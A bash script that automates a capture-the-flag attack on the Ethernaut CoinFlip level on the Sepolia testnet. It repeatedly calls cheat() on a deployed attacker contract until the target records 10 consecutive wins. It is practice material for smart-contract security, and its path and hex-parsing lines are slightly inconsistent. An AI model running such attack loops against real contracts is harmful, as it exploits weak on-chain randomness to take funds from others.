#!/bin/bash
# script/levels/02_CoinFlip/attack.sh
# CoinFlip Attack Script - Execute cheat() until 10 consecutive wins
#
# Usage:
#   bash script/levels/02_CoinFlip/attack.sh <ATTACKER_ADDRESS>
#
# Example:
#   bash script/levels/02_CoinFlip/attack.sh 0xf0878A84C92473adAEeF2BA8F0f0d5Aa2599EFB8
#
# Requirements:
#   - .env file with SEPOLIA_RPC_URL and PRIVATE_KEY
#   - Attacker contract deployed
#   - Target at COINFLIP_TARGET in .env

set -e  # Exit on error

# Load environment
if [ ! -f .env ]; then
    echo "❌ Error: .env file not found"
    echo "Please create .env from .env.example"
    exit 1
fi

source .env

# Configuration
ATTACKER_ADDRESS="${1}"
TARGET_ADDRESS="${COINFLIP_TARGET}"
TARGET_WINS=10

# Validate inputs
if [ -z "$ATTACKER_ADDRESS" ]; then
    echo "❌ Error: Attacker address required"
    echo "Usage: bash script/levels/03_CoinFlip/attack.sh <ATTACKER_ADDRESS>"
    exit 1
fi

if [ -z "$TARGET_ADDRESS" ]; then
    echo "❌ Error: COINFLIP_TARGET not set in .env"
    exit 1
fi

if [ -z "$SEPOLIA_RPC_URL" ] || [ -z "$PRIVATE_KEY" ]; then
    echo "❌ Error: SEPOLIA_RPC_URL and PRIVATE_KEY required in .env"
    exit 1
fi

echo "╔════════════════════════════════════════════════════════╗"
echo "║           CoinFlip CTF - Attack Script                ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""
echo "Attacker: $ATTACKER_ADDRESS"
echo "Target:   $TARGET_ADDRESS"
echo "RPC:      ${SEPOLIA_RPC_URL:0:40}..."
echo ""

# Get initial wins
INITIAL_WINS=$(cast call "$TARGET_ADDRESS" "consecutiveWins()" --rpc-url "$SEPOLIA_RPC_URL" 2>/dev/null | printf "%d" 0x$(cat))
echo "Starting wins: $INITIAL_WINS/10"
echo ""

# Continue attacking until we reach 10 wins
CURRENT_WINS=$INITIAL_WINS

while [ $CURRENT_WINS -lt $TARGET_WINS ]; do
    echo "[$CURRENT_WINS/$TARGET_WINS] Attacking..."

    # Call cheat() on attacker contract
    TX_RESULT=$(cast send "$ATTACKER_ADDRESS" "cheat()" \
        --rpc-url "$SEPOLIA_RPC_URL" \
        --private-key "$PRIVATE_KEY" 2>&1)

    if echo "$TX_RESULT" | grep -q "status.*1"; then
        echo "   ✓ Transaction successful"
        echo "   ⏳ Waiting for next block (~15 seconds)..."
        sleep 15

        # Check current wins
        WINS_HEX=$(cast call "$TARGET_ADDRESS" "consecutiveWins()" --rpc-url "$SEPOLIA_RPC_URL" 2>/dev/null)
        CURRENT_WINS=$(printf "%d" "$WINS_HEX" 2>/dev/null || echo 0)
        echo "   📊 Current wins: $CURRENT_WINS/10"

        if [ $CURRENT_WINS -eq 0 ]; then
            echo "   ⚠️  Lost streak! Restarting..."
            sleep 15
        fi
    else
        echo "   ✗ Transaction failed!"
        echo "   Error: $TX_RESULT"
        sleep 15
    fi

    echo ""
done

echo "╔════════════════════════════════════════════════════════╗"
echo "║              🎉 ATTACK SUCCESSFUL! 🎉                 ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""

# Final verification
FINAL_WINS=$(cast call "$TARGET_ADDRESS" "consecutiveWins()" --rpc-url "$SEPOLIA_RPC_URL" 2>/dev/null | printf "%d" 0x$(cat))
echo "Final consecutiveWins: $FINAL_WINS/10"
echo ""
echo "✅ Next step: Submit instance on https://ethernaut.openzeppelin.com/level/3"
